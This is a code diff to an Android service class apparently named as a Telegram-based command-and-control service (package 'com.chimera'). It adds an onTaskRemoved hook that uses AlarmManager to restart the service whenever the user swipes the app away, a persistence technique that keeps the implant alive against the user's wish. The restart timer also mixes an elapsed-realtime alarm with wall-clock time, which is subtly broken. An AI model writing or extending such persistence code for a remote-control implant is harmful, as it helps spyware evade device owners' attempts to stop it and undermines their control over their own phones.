@@ -1,9 +1,12 @@
 package com.chimera;
 
+import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import android.os.IBinder;
@@ -87,5 +90,29 @@ public class TelegramC2Service extends Service {
     @Override
     public IBinder onBind(Intent intent) {
         return null;
+    }
+
+    // ADDED: THIS METHOD IS CALLED WHEN THE USER SWIPES THE APP FROM RECENTS
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        try {
+            // Schedule the service to restart
+            Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
+            restartServiceIntent.setPackage(getPackageName());
+
+            PendingIntent restartServicePendingIntent = PendingIntent.getService(
+                    getApplicationContext(),
+                    1000, // A unique request code
+                    restartServiceIntent,
+                    PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
+            );
+
+            AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
+            alarmService.set(AlarmManager.ELAPSED_REALTIME, System.currentTimeMillis() + 1000, restartServicePendingIntent);
+
+        } catch (Exception e) {
+            ErrorLogger.logError(this, "TelegramC2Service_OnTaskRemoved", e);
+        }
+        super.onTaskRemoved(rootIntent);
     }
 }
